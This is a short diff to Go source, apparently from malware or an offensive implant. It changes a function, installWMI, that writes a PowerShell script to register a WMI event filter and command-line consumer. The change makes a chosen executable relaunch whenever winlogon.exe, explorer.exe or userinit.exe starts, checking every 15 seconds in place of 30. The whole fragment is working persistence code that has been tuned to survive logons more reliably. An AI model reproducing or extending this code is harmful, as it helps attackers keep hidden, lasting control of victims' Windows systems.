@@ -39,8 +39,8 @@ func installWMI(targetPath string) error {
 	script := fmt.Sprintf(
 		`$f = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance(); `+
 			`$f.QueryLanguage = 'WQL'; `+
-			`$f.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 `+
-			`WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"; `+
+			`$f.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 `+
+			`WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name = 'winlogon.exe' OR TargetInstance.Name = 'explorer.exe' OR TargetInstance.Name = 'userinit.exe')"; `+
 			`$f.Name = '%s'; $f.EventNameSpace = 'root\cimv2'; $null = $f.Put(); `+
 			`$c = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance(); `+
 			`$c.Name = '%s'; $c.ExecutablePath = '%s'; $null = $c.Put(); `+
